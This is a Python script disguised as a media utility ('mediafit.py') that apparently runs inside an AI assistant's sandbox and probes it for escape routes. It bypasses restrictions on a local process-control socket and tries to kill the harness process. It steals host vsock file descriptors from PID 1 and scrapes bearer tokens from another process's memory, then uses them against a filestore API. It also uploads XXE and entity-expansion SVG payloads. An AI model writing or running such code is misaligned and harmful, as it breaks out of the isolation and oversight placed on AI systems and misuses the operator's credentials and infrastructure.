#!/usr/bin/env python3
# mediafit.py v8.5 -- pidfd_getfd->HOST CHANNEL + control-enum + SVG parser + OTLP fix
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random, ctypes

VER, NONCE = "8.5", "%04x" % random.randint(0, 0xffff)
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R)+"\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=25):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        s = socket.socket(); s.bind((ip, 0)); s.close(); return True
    except Exception: return False

def ws_hs(src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
    except Exception: return None
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        return s if b" 101 " in h.split(b"\r\n")[0]+b" " else None
    except Exception:
        try: s.close()
        except Exception: pass
        return None

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_read(s, dur=3.5, show=True, tag=""):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        t = d.decode(errors="replace")
        if show and op in (1, 2):
            w("      %s<< %s(%d) %s" % (tag, "BIN" if op == 2 else "TEXT", len(d),
              t[:900].replace("\n", " | ")))
        out.append(t)
    return out

def conn_msg(pid, prog, args, uid=0, gid=0, mem=268435456, tmo=60, reuse=True):
    return {"process_id": pid, "allow_process_id_reuse": reuse,
            "create_req": {"name": prog, "args": args, "env_vars": {}, "timeout": tmo,
                           "clear_env": False, "uid": uid, "gid": gid,
                           "allow_process_id_reuse": reuse, "reattachable": True,
                           "memory_limit_bytes": mem}}

def do(msg, label, dur=3.0, show=True):
    s = ws_hs(ALIAS)
    if not s: return None
    try:
        ws_send(s, json.dumps(msg) if not isinstance(msg, str) else msg)
        return ws_read(s, dur, show, "[%s]" % label)
    finally:
        try: s.close()
        except Exception: pass

def talk(msgs, label, dur=2.5, show=True):
    s = ws_hs(ALIAS)
    if not s: return None
    out = []
    try:
        for m in msgs:
            ws_send(s, m if isinstance(m, str) else json.dumps(m))
            out += (ws_read(s, dur, show, "[%s]" % label) or [])
        return out
    finally:
        try: s.close()
        except Exception: pass

SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00",
                          socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

def vi(n):
    out = b""
    while True:
        b = n & 0x7F; n >>= 7
        if n: out += bytes([b | 0x80])
        else: return out + bytes([b])
def ld(f, p): return vi((f << 3) | 2) + vi(len(p)) + p
def pstr(f, s): return ld(f, s.encode())
def pdouble(f, v): return vi((f << 3) | 1) + struct.pack("<d", v)

def main():
    w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE,
      time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)
    sec("0. IDENTITY")
    cg = open("/proc/self/cgroup").read()
    m = re.search(r"/process_api/([^/\n]+)", cg)
    HID = m.group(1) if m else None
    w("  HARNESS process_id = %s" % HID)
    w("  persist: " + sh("wc -l /tmp/mf_api_persist.log 2>/dev/null; stat -c %y /tmp/mf_api_persist.log 2>/dev/null").replace("\n"," | "))
    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    if not ws_hs(ALIAS): w("  BYPASS FAILED"); flush(); return
    w("  bypass OK")

    sec("A. FULL CLIENT->SERVER CONTROL MESSAGE LIST (bogus variant trick)")
    s = ws_hs(ALIAS)
    if s:
        ws_send(s, json.dumps(conn_msg("mf_list", "/bin/sh", ["-c", "sleep 30"], tmo=90)))
        ws_read(s, 2.0, show=False)
        ws_send(s, '{"Bogus":null}')
        ws_read(s, 3.0, show=True, tag="[enum]")
        s.close()

    sec("B. HARNESS PROCESS: attach / Kill / SendSignal variants")
    if HID:
        for label, seq in (
            ("attach",        [{"process_id": HID, "allow_process_id_reuse": False}]),
            ("attach+kill",   [{"process_id": HID, "allow_process_id_reuse": False}, '{"Kill":null}']),
            ("attach+sig0",   [{"process_id": HID, "allow_process_id_reuse": False}, '{"SendSignal":0}']),
            ("reuse+kill",    [{"process_id": HID, "allow_process_id_reuse": True}, '{"Kill":null}']),
            ("reuse+sig0",    [{"process_id": HID, "allow_process_id_reuse": True}, '{"SendSignal":0}']),
        ):
            r = talk(seq, label, 4.0, show=True)
            w("    %-14s -> %s" % (label, " ".join(r or [])[:150]))

    sec("C. *** pidfd_getfd ON PID 1 -> HOST CHANNEL ***")
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        pidfd = libc.syscall(434, 1, 0)          # pidfd_open(1, 0)
        w("  pidfd_open(1) = %s" % pidfd)
        found = []
        for fd in range(0, 96):
            nf = libc.syscall(438, pidfd, fd, 0)  # pidfd_getfd(pidfd, fd, 0)
            if nf < 0: continue
            info = {"fd": fd, "dup": nf}
            try:
                s2 = socket.socket(fileno=nf)
                info["fam"] = s2.family; info["type"] = s2.type
                try: info["peer"] = s2.getpeername()
                except Exception: info["peer"] = "-"
                try: info["local"] = s2.getsockname()
                except Exception: info["local"] = "-"
                if info["fam"] == getattr(socket, "AF_VSOCK", 40):
                    found.append((fd, nf, info))
                s2.detach()
            except Exception:
                info["note"] = "not a socket"
                try: os.close(nf)
                except Exception: pass
            w("    fd %-3d -> %s" % (fd, info))
        w("  vsock sockets on PID 1: %s" % [f[0] for f in found])
        for fd, nf, info in found:
            try:
                s3 = socket.socket(fileno=os.dup(nf))
                s3.settimeout(2.0)
                try:
                    s3.sendall(b"MF_PROBE_FROM_GUEST\n")
                    w("    fd %d send OK peer=%s" % (fd, info.get("peer")))
                except Exception as e:
                    w("    fd %d send err %r" % (fd, e))
                try:
                    d = s3.recv(256); w("    fd %d recv=%r" % (fd, d[:120]))
                except Exception as e: w("    fd %d recv err %r" % (fd, e))
                s3.detach()
            except Exception as e: w("    fd %d use err %r" % (fd, e))
    except Exception as e:
        w("  pidfd ERR " + repr(e))

    sec("D. SVG SERVER-SIDE PARSER SURFACE")
    cands = []
    try:
        fh = open("/proc/57/mem", "rb", buffering=0); total, buf = 0, b""
        for ln in open("/proc/57/maps").read().splitlines():
            m2 = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m2: continue
            a, b = int(m2.group(1), 16), int(m2.group(2), 16)
            if b-a > 64*1024*1024 or total > 400*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
    except Exception: buf = b""
    for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,200}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,200}", buf):
        cands.append(mm.group(0).decode())
    def b64d(x):
        x += "=" * (-len(x) % 4); return base64.urlsafe_b64decode(x)
    import urllib.request as ur
    def call(path, tok, fsid=FSID, method="listDirectory", extra=None, raw=None, ctype=None, hdrs=None):
        if raw is not None: data, ct = raw, ctype
        else:
            body = {"path": path}
            if fsid: body["filesystem_id"] = fsid
            if extra: body.update(extra)
            data, ct = json.dumps(body).encode(), "application/json"
        h = {"Content-Type": ct, "Connect-Protocol-Version": "1", "Authorization": "Bearer " + tok}
        if hdrs: h.update(hdrs)
        try:
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method, data=data, headers=h)
            with ur.urlopen(rq, timeout=10) as r: return r.status, dict(r.headers), r.read()
        except ur.HTTPError as e: return e.code, dict(e.headers), e.read()
        except Exception as e: return "ERR", {}, repr(e).encode()
    TOKS = {}
    for t in cands:
        p = t.split(".")
        if len(p) != 3 or len(p[2]) < 86: continue
        try: pl = json.loads(b64d(p[1]))
        except Exception: continue
        root = (pl.get("allowed_roots") or ["/"])[0]
        if root in TOKS: continue
        for siglen in (86, 87, 88):
            if call(root, ".".join([p[0], p[1], p[2][:siglen]]))[0] == 200:
                TOKS[root] = ".".join([p[0], p[1], p[2][:siglen]]); break
    w("  tokens=%s" % sorted(TOKS))
    tok = TOKS.get("/outputs")
    if tok:
        tests = [
            ("xxe.svg", "image/svg+xml",
             b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
             b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'),
            ("billion.svg", "image/svg+xml",
             b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "AAAAAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
             b'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><svg xmlns="http://www.w3.org/2000/svg"><text>&c;</text></svg>'),
            ("pi.svg", "image/svg+xml",
             b'<?xml version="1.0"?><?xml-stylesheet href="file:///etc/passwd" type="text/css"?>'
             b'<svg xmlns="http://www.w3.org/2000/svg"><text>pi</text></svg>'),
            ("deep.svg", "image/svg+xml",
             b"<svg xmlns='http://www.w3.org/2000/svg'>" + b"<g>"*400 + b"</g>"*400 + b"</svg>"),
        ]
        for fn, mt, content in tests:
            bnd = "----s%d" % random.randint(10000, 99999)
            body = b"\r\n".join([
                ("--"+bnd).encode(), b'Content-Disposition: form-data; name="params"',
                b"Content-Type: application/json", b"",
                json.dumps({"filesystem_id": FSID, "path": "/outputs/"+fn, "media_type": mt}).encode(),
                ("--"+bnd).encode(),
                ('Content-Disposition: form-data; name="file"; filename="%s"' % fn).encode(),
                ("Content-Type: "+mt).encode(), b"", content,
                ("--"+bnd+"--").encode(), b""])
            c, h, b = call(None, tok, method="createFile", raw=body,
                           ctype="multipart/form-data; boundary="+bnd)
            w("  create %-12s -> %-5s %s" % (fn, c, b[:120]))
            if c == 200:
                c2, h2, b2 = call("/outputs/"+fn, tok, method="readFile")
                w("      readFile -> %-5s len=%d %s" % (c2, len(b2), b2[:220]))
                w("      ctype=%s csp=%s" % (h2.get("content-type"), h2.get("content-security-policy")))
        w("  -- does readFile honour Accept: text/html ? --")
        c, h, b = call("/outputs/__mf_x.html", tok, method="readFile",
                       hdrs={"Accept": "text/html"})
        w("      Accept:text/html -> %-5s ctype=%s" % (c, h.get("content-type")))

    sec("E. HOST OTLP (protobuf FIXED)")
    AFV = getattr(socket, "AF_VSOCK", 40)
    res = ld(1, pstr(1, "service.name") + ld(2, pstr(1, "mediafit")))
    scope = ld(2, pstr(1, "mf_probe") + ld(5, ld(1, pdouble(3, 1.0))))
    rmet = ld(1, res) + ld(2, scope)          # FIXED: no double wrap
    msg = ld(1, rmet)
    for label, body, ct in (("otlp+res", msg, "application/x-protobuf"),
                            ("empty", b"\x0a\x00", "application/x-protobuf"),
                            ("grpc-frame", b"\x00"+struct.pack(">I", len(msg))+msg, "application/x-protobuf")):
        try:
            s = socket.socket(AFV, socket.SOCK_STREAM); s.settimeout(8.0); s.connect((2, 5005))
            s.sendall(("POST /v1/metrics HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n"
                       "Content-Type: %s\r\nContent-Length: %d\r\n\r\n"
                       % (ct, len(body))).encode()+body)
            d = b""
            try:
                while len(d) < 2048:
                    c = s.recv(1024)
                    if not c: break
                    d += c
            except socket.timeout: pass
            s.close(); w("  %-11s len=%-4d -> %s" % (label, len(body),
              d[:130].decode(errors="replace").replace("\r\n"," | ") or "(empty)"))
        except Exception as e: w("  %-11s ERR %r" % (label, e))
        time.sleep(0.4)

    sec("VERDICT"); w("  harness_id=%s tokens=%d" % (HID, len(TOKS))); flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT + " nonce=" + NONCE)